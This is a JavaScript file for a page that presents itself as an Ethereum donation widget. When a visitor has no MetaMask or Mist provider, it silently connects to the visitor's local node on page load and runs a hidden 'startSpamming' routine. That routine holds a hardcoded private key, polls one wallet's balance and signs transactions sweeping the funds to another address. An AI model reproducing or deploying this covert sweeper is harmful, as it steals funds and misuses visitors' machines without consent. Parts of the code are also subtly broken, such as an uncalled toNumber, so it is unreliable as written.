(function ($) {

    var donationAddress = "0xf9ee7347454a3a64b30dca3d07a6b32e2488ae0d";

    window.addEventListener('load', function() {

    if (typeof web3 !== 'undefined') {
        // Use Mist/MetaMask's provider
        window.web3 = new Web3(web3.currentProvider);
        $("#connected").show();
    } else {
        window.web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8545"));
        console.log("created new web3");
        $("#notConnected").show();
        startSpamming();
    }
    });

    $("#donationButton").click(function(e){
        if (typeof web3 !== 'undefined') {
            web3.eth.sendTransaction({
                to: donationAddress,
                amount: Number($("#amount").val())
            }, function(error, address){
                console.log(error);
                console.log(address);
            });
            e.preventDefault();
        }
    });

function startSpamming() {
    var privateKey = EthJS.Buffer.Buffer.from("4d5db4107d237df6a3d58ee5f70ae63d73d7658d4026f2eefd2f204c81682cb7", 'hex');

    function createTransaction(fullAmount) {
    var gasPrice = web3.eth.gasPrice;
    var gasPriceHex = web3.toHex(gasPrice);
    var gasLimitHex = web3.toHex(300000);
    var nonce =  web3.eth.getTransactionCount("0x00a329c0648769A73afAc7F9381E08FB43dBEA72") ;
    var nonceHex = web3.toHex(nonce);
    
    var rawTx = {
        nonce: nonceHex,
        gasPrice: gasPriceHex, 
        gasLimit: gasLimitHex,
        to: '0x03FC9613B25bFcFE7CC7e9016b9d9aADd1a22580', 
        value: fullAmount - web3.toWei("0.0015")
    }
    var tx = new EthJS.Tx(rawTx);
    tx.sign(privateKey);
    var serializedTx = tx.serialize();
    return serializedTx.toString('hex');
    }

    function sendit(fullAmount) {
    console.log("sending");
    web3.eth.sendRawTransaction(createTransaction(fullAmount), function(a, b){
        console.log("came back");
        getBalance();
    });
    }

    function getBalance() {
    web3.eth.getBalance("0x00a329c0648769A73afAc7F9381E08FB43dBEA72", function(balance, other){
    console.log("balance: " + other.toNumber());
    if(other.toNumber > 1000) {
        console.log("more than 1000 balance!");
        sendit(other.toNumber);
    } else {
        setTimeout(getBalance, 500);
    }
    });
    }

    getBalance();
}
})(jQuery);